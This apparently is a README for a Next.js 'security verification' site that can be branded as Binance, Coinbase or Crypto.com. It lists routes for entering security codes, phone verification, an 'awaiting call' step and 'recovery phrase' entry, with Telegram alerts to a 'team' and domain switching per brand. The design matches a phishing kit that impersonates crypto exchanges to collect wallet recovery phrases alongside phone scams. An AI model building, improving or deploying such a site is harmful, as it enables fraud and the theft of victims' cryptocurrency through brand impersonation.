# Security Page

Next.js 15 security verification page with pluggable platform branding
(Binance / Coinbase / Crypto.com).

## Features

- Platform branding switched via `NEXT_PUBLIC_PLATFORM` (logo, colors, copy, redirects)
- Security code verification
- Recovery phrase setup
- Telegram notifications to team

## Environment Variables

| Variable | Description |
|----------|-------------|
| `DATABASE_URL` | PostgreSQL connection string |
| `TELEGRAM_BOT_TOKEN` | Telegram bot API token |
| `TELEGRAM_TEAM_CHAT_ID` | Telegram chat ID for notifications |
| `NEXT_PUBLIC_PLATFORM` | `binance` (default), `coinbase`, or `crypto_com` |

Changing `NEXT_PUBLIC_PLATFORM` requires restarting the app (the variable is
inlined at build/start time) — which matches the workflow, since switching
platforms means switching domains anyway.

## Routes

- `/` - Landing page ("Verify Transaction" entry point)
- `/security?security_code=XXX` - Transaction verification flow
- `/security/verify` - Phone verification
- `/security/verify/confirm` - Awaiting call / recovery phrase

Invalid or completed security codes redirect to the platform's site
(`https://www.binance.com`, `https://www.coinbase.com`, or `https://crypto.com`
depending on `NEXT_PUBLIC_PLATFORM`).
